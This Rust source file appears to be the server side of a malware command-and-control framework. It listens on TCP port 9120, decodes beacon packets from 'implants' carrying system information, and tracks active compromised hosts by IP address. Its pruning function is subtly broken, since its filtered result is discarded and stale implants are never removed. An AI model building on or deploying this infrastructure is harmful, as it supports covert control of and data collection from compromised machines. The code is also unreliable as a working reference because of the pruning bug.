use std::{
    collections::HashMap,
    io::Read,
    net::{IpAddr, TcpListener},
    time::Instant,
};

use common::{IMPLANT_REPORT_RATE_SECONDS, Packet, SystemInfo, decode};

fn main() -> Result<(), Box<dyn std::error::Error>> {
    let listener = TcpListener::bind("0.0.0.0:9120")?;
    let mut implants = HashMap::new();

    for stream in listener.incoming() {
        let mut stream = stream.unwrap();

        let mut buf = vec![0; 1024];

        stream.read(&mut buf).expect("failed to read from stream");

        let decoded = decode(&buf).unwrap();

        println!("{decoded:?}");

        match decoded {
            Packet::Beacon { system_info } => {
                implants.insert(
                    stream.peer_addr().unwrap().ip(),
                    Implant {
                        last_report: Instant::now(),
                        system_info,
                    },
                );
            }
        }

        remove_old_implants(&mut implants);
        println!("Active implants: {implants:?}");
    }

    Ok(())
}

fn remove_old_implants(implants: &mut HashMap<IpAddr, Implant>) -> HashMap<IpAddr, Implant> {
    let now = Instant::now();

    implants
        .iter()
        .filter(|(_ip, implant)| {
            now.duration_since(implant.last_report).as_secs() < IMPLANT_REPORT_RATE_SECONDS.end
        })
        .map(|(ip, implant)| (*ip, implant.clone()))
        .collect()
}

#[derive(Debug, Clone)]
struct Implant {
    last_report: Instant,
    system_info: SystemInfo,
}
